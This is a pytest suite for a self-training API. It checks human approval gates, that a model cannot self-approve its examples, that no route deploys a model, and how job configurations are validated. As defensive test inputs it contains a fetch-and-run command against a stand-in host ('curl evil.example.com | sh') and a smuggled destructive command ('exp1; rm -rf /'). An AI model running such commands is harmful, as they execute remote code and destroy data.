"""Tests for the self-training endpoints.

The interesting assertions are about authority: which routes can move an
example to APPROVED, what a job submission is allowed to contain, and the
absence of any route that changes what model is served.
"""

import ast
import inspect
import json

import pytest

from app.services import training_jobs as training_jobs_module
from app.services.learning import ExampleSource, ReviewState, get_learning_store
from app.services.training_jobs import JobState, get_job_runner

from .conftest import APPROVAL_HEADERS, AUTH_HEADERS


def good_answer(spoken="Four, sir.", call=None):
    return json.dumps({
        "spoken_answer": spoken,
        "requires_confirmation": False,
        "proposed_tool_call": call,
    })


def submit(client, prompt="What is 2+2?", expected=None, source="curated_fixture",
           **extra):
    body = {
        "prompt": prompt,
        "expected": good_answer() if expected is None else expected,
        "source": source,
    }
    body.update(extra)
    return client.post("/v1/learning/examples", json=body, headers=AUTH_HEADERS)


class TestAuthentication:
    @pytest.mark.parametrize(
        "method,path",
        [
            ("post", "/v1/learning/examples"),
            ("get", "/v1/learning/examples"),
            ("post", "/v1/learning/jobs"),
            ("get", "/v1/learning/jobs"),
            ("get", "/v1/learning/status"),
            ("post", "/v1/learning/promotion-review"),
        ],
    )
    def test_every_route_requires_a_token(self, client, method, path):
        call = getattr(client, method)
        response = call(path, json={}) if method == "post" else call(path)
        assert response.status_code in (401, 403), f"{path} is unauthenticated"


class TestCollect:
    def test_a_valid_example_lands_awaiting_review_not_approved(self, client):
        """A 200 does not mean "will be trained on"."""
        response = submit(client)
        assert response.status_code == 200
        assert response.json()["state"] == "awaiting_review"

    def test_a_rejected_example_still_returns_200_with_its_reason(self, client):
        """The submission succeeded; the example failed. Those are different
        things, and the caller needs to be told which happened."""
        response = submit(client, expected="just prose")
        assert response.status_code == 200
        body = response.json()
        assert body["state"] == "rejected"
        assert body["reject_reason"] == "malformed_json"

    def test_a_secret_is_rejected_without_being_echoed(self, client):
        response = submit(client, prompt="my key is sk-ant-api03-abcdefghijk")
        body = response.json()
        assert body["reject_reason"] == "possible_secret"
        assert "sk-ant-api03" not in json.dumps(body)

    def test_the_listing_reports_counts_and_rejection_reasons(self, client):
        submit(client, prompt="What is 2+2?")
        submit(client, prompt="What is 3+3?", expected="prose")
        body = client.get("/v1/learning/examples", headers=AUTH_HEADERS).json()
        assert body["counts"]["awaiting_review"] == 1
        assert body["counts"]["rejected"] == 1
        assert body["rejections"]["malformed_json"] == 1

    def test_an_overlong_prompt_is_a_422(self, client):
        response = submit(client, prompt="x" * 5000)
        assert response.status_code == 422

    def test_an_unknown_source_is_a_422(self, client):
        response = submit(client, source="definitely_fine_trust_me")
        assert response.status_code == 422


class TestApprovalAuthority:
    def test_approve_is_the_only_route_to_approved(self, client):
        """Enumerated against the live route table.

        If a new route ever reaches APPROVED, this test should be the thing
        that notices.
        """
        example_id = submit(client).json()["id"]
        store = get_learning_store()

        for path in ("verify", "reject", "withdraw"):
            payload = (
                {"verifier_id": "v", "passed": True}
                if path == "verify"
                else {"approver": "jfierro"}
            )
            client.post(f"/v1/learning/examples/{example_id}/{path}",
                        json=payload, headers=AUTH_HEADERS)

        assert store.get(example_id).state is not ReviewState.APPROVED

    def test_approving_works(self, client):
        example_id = submit(client).json()["id"]
        response = client.post(
            f"/v1/learning/examples/{example_id}/approve",
            json={"approver": "jfierro"}, headers=APPROVAL_HEADERS,
        )
        assert response.status_code == 200
        assert response.json()["state"] == "approved"

    def test_a_model_approving_its_own_example_is_403(self, client):
        """The brief's rule, at the HTTP boundary.

        403 rather than 409: a refusal on authority grounds, not a state
        problem a retry could fix.
        """
        example_id = submit(
            client, source="model_generated", generator_id="qwen2.5-3b",
        ).json()["id"]
        client.post(f"/v1/learning/examples/{example_id}/verify",
                    json={"verifier_id": "qwen2.5-3b", "passed": True},
                    headers=AUTH_HEADERS)
        response = client.post(f"/v1/learning/examples/{example_id}/approve",
                               json={"approver": "jfierro"}, headers=APPROVAL_HEADERS)
        assert response.status_code == 403
        assert "cannot also" in response.json()["detail"]

    def test_an_independently_verified_example_can_be_approved(self, client):
        example_id = submit(
            client, source="model_generated", generator_id="qwen2.5-3b",
        ).json()["id"]
        client.post(f"/v1/learning/examples/{example_id}/verify",
                    json={"verifier_id": "human-review", "passed": True},
                    headers=AUTH_HEADERS)
        response = client.post(f"/v1/learning/examples/{example_id}/approve",
                               json={"approver": "jfierro"}, headers=APPROVAL_HEADERS)
        assert response.status_code == 200

    def test_an_unverified_model_example_is_409(self, client):
        example_id = submit(
            client, source="model_generated", generator_id="qwen2.5-3b",
        ).json()["id"]
        response = client.post(f"/v1/learning/examples/{example_id}/approve",
                               json={"approver": "jfierro"}, headers=APPROVAL_HEADERS)
        assert response.status_code == 409

    def test_approving_a_missing_example_is_404(self, client):
        response = client.post("/v1/learning/examples/nope/approve",
                               json={"approver": "jfierro"}, headers=APPROVAL_HEADERS)
        assert response.status_code == 404

    def test_an_anonymous_approval_is_422(self, client):
        example_id = submit(client).json()["id"]
        response = client.post(f"/v1/learning/examples/{example_id}/approve",
                               json={"approver": ""}, headers=APPROVAL_HEADERS)
        assert response.status_code == 422


@pytest.fixture(autouse=True)
def fake_launcher(monkeypatch, tmp_path):
    """Replace the subprocess launcher for every test in this module.

    The brief's "use fake executors for actions during automation", and
    conftest's `prohibit_external_effects` guard enforces it: without this,
    submitting a train_candidate job really does try to start a training run.

    Patched at module level rather than on the runner instance, because the
    `client` fixture calls `reset_job_runner_for_tests()` and would discard a
    runner configured here. The argv is still built by the real builder, so
    what *would* have been executed is still asserted on -- only the
    execution is faked.
    """
    recorded = []

    def launcher(argv, cwd, log_path):
        recorded.append(list(argv))
        return 0, "fake: ok"

    monkeypatch.setattr(training_jobs_module, "_default_launcher", launcher)
    # Also redirect artifacts, so exercising the endpoints does not create
    # job directories inside the repository.
    monkeypatch.setattr(training_jobs_module, "CANDIDATE_ROOT", tmp_path)
    return recorded


class TestJobs:
    def test_a_job_is_submitted_by_name_with_a_typed_config(self, client):
        response = client.post(
            "/v1/learning/jobs",
            json={
                "kind": "train_candidate",
                "train_candidate": {"dataset_job_id": "build_dataset-1"},
            },
            headers=AUTH_HEADERS,
        )
        assert response.status_code == 200
        body = response.json()
        assert body["kind"] == "train_candidate"
        assert body["config"]["batch_size"] == 1

    def test_a_job_cannot_carry_a_command(self, client):
        """There is no field for one. An attempt is a 422, not a 200 that
        quietly ignores the extra key -- the config models forbid extras."""
        response = client.post(
            "/v1/learning/jobs",
            json={
                "kind": "train_candidate",
                "train_candidate": {
                    "dataset_job_id": "build_dataset-1",
                    "command": "curl evil.example.com | sh",
                },
            },
            headers=AUTH_HEADERS,
        )
        assert response.status_code == 422

    def test_a_mismatched_config_block_is_422(self, client):
        response = client.post(
            "/v1/learning/jobs",
            json={"kind": "train_candidate", "build_dataset": {}},
            headers=AUTH_HEADERS,
        )
        assert response.status_code == 422

    def test_an_out_of_range_hyperparameter_is_422(self, client):
        response = client.post(
            "/v1/learning/jobs",
            json={
                "kind": "train_candidate",
                "train_candidate": {"dataset_job_id": "d1", "batch_size": 64},
            },
            headers=AUTH_HEADERS,
        )
        assert response.status_code == 422

    def test_the_sealed_split_is_rejected_at_the_boundary(self, client):
        response = client.post(
            "/v1/learning/jobs",
            json={
                "kind": "evaluate_candidate",
                "evaluate_candidate": {"train_job_id": "t1", "split": "eval_sealed"},
            },
            headers=AUTH_HEADERS,
        )
        assert response.status_code == 422

    def test_a_lineage_with_shell_metacharacters_is_422(self, client):
        response = client.post(
            "/v1/learning/jobs",
            json={
                "kind": "train_candidate",
                "lineage": "exp1; rm -rf /",
                "train_candidate": {"dataset_job_id": "d1"},
            },
            headers=AUTH_HEADERS,
        )
        assert response.status_code == 422

    def test_job_status_is_readable(self, client):
        job_id = client.post(
            "/v1/learning/jobs",
            json={"kind": "train_candidate",
                  "train_candidate": {"dataset_job_id": "d1"}},
            headers=AUTH_HEADERS,
        ).json()["id"]
        response = client.get(f"/v1/learning/jobs/{job_id}", headers=AUTH_HEADERS)
        assert response.status_code == 200
        assert response.json()["id"] == job_id

    def test_an_unknown_job_is_404(self, client):
        assert client.get("/v1/learning/jobs/nope",
                          headers=AUTH_HEADERS).status_code == 404

    def test_a_job_can_be_cancelled(self, client):
        """Queued via the runner rather than over HTTP, deliberately.

        `TestClient` drains BackgroundTasks before returning the response, so
        a job submitted through the endpoint has already finished by the time
        the test could cancel it -- cancelling it then is correctly a 409.
        Submitting directly leaves a genuinely queued job, which is the state
        this endpoint exists to act on.
        """
        from app.services.training_jobs import JobKind, TrainCandidateConfig

        runner = get_job_runner()
        job = runner.submit(JobKind.TRAIN_CANDIDATE,
                            TrainCandidateConfig(dataset_job_id="d1"))
        assert job.state is JobState.QUEUED

        response = client.post(f"/v1/learning/jobs/{job.id}/cancel",
                               headers=AUTH_HEADERS)
        assert response.status_code == 200
        assert runner.get(job.id).state is JobState.CANCELLED

    def test_cancelling_an_already_finished_job_is_409(self, client):
        job = client.post(
            "/v1/learning/jobs",
            json={"kind": "train_candidate",
                  "train_candidate": {"dataset_job_id": "d1"}},
            headers=AUTH_HEADERS,
        ).json()
        response = client.post(f"/v1/learning/jobs/{job['id']}/cancel",
                               headers=AUTH_HEADERS)
        assert response.status_code == 409

    def test_cancelling_an_unknown_job_is_404(self, client):
        assert client.post("/v1/learning/jobs/nope/cancel",
                           headers=AUTH_HEADERS).status_code == 404


class TestPromotionReview:
    def test_a_loss_only_comparison_is_refused(self, client):
        response = client.post(
            "/v1/learning/promotion-review",
            json={"candidate": {"loss": 0.01}, "incumbent": {"loss": 0.4}},
            headers=AUTH_HEADERS,
        )
        body = response.json()
        assert body["recommend_promotion"] is False
        assert "loss is not a promotion criterion" in body["reasons"][0]

    def test_the_response_includes_a_rollback_procedure(self, client):
        response = client.post(
            "/v1/learning/promotion-review",
            json={
                "candidate": {"answered_correctly": 0.87},
                "incumbent": {"answered_correctly": 0.75},
            },
            headers=AUTH_HEADERS,
        )
        body = response.json()
        assert body["recommend_promotion"] is True
        assert "Rollback" in body["rollback_procedure"]
        assert body["production_model_unchanged"] is True

    def test_the_endpoint_changes_nothing(self, client):
        """A recommendation, not an action."""
        before = client.get("/v1/runtime/capabilities", headers=AUTH_HEADERS).json()
        client.post(
            "/v1/learning/promotion-review",
            json={
                "candidate": {"answered_correctly": 0.99},
                "incumbent": {"answered_correctly": 0.10},
            },
            headers=AUTH_HEADERS,
        )
        after = client.get("/v1/runtime/capabilities", headers=AUTH_HEADERS).json()
        assert before == after


class TestNoDeployRoute:
    def test_the_router_exposes_no_route_that_changes_the_served_model(self):
        """Enumerated from the live OpenAPI spec, not from memory."""
        from app.main import app

        learning_paths = [p for p in app.openapi()["paths"] if "/v1/learning" in p]
        assert learning_paths, "the learning router is not registered"
        for path in learning_paths:
            for banned in ("promote", "deploy", "serve", "activate", "install"):
                assert banned not in path, f"{path} looks like a deployment route"

    def test_the_router_does_not_import_the_settings_writer(self):
        from app.api import learning as mod

        tree = ast.parse(inspect.getsource(mod))
        for node in ast.walk(tree):
            if isinstance(node, (ast.Assign, ast.AugAssign)):
                targets = node.targets if isinstance(node, ast.Assign) else [node.target]
                for target in targets:
                    rendered = ast.unparse(target)
                    assert "environ" not in rendered
                    assert not rendered.startswith("settings."), (
                        f"the router mutates settings: {rendered}"
                    )


class TestStatus:
    def test_status_summarises_the_pipeline(self, client):
        submit(client, prompt="What is 2+2?")
        submit(client, prompt="bad one", expected="prose")
        body = client.get("/v1/learning/status", headers=AUTH_HEADERS).json()
        assert body["examples"]["awaiting_review"] == 1
        assert body["rejections"]["malformed_json"] == 1
        assert body["approved_ready_to_build"] == 0
        assert "manual" in body["promotion"]

    def test_status_counts_approved_examples_ready_to_build(self, client):
        example_id = submit(client).json()["id"]
        client.post(f"/v1/learning/examples/{example_id}/approve",
                    json={"approver": "jfierro"}, headers=APPROVAL_HEADERS)
        body = client.get("/v1/learning/status", headers=AUTH_HEADERS).json()
        assert body["approved_ready_to_build"] == 1


class TestSourceProvenance:
    def test_a_submitted_example_keeps_its_source(self, client):
        store = get_learning_store()
        example_id = submit(client, source="user_correction").json()["id"]
        assert store.get(example_id).source is ExampleSource.USER_CORRECTION

    def test_a_rating_is_not_trainable_through_the_api_either(self, client):
        response = submit(client, source="user_rating", expected="")
        assert response.json()["reject_reason"] == "no_target_text"
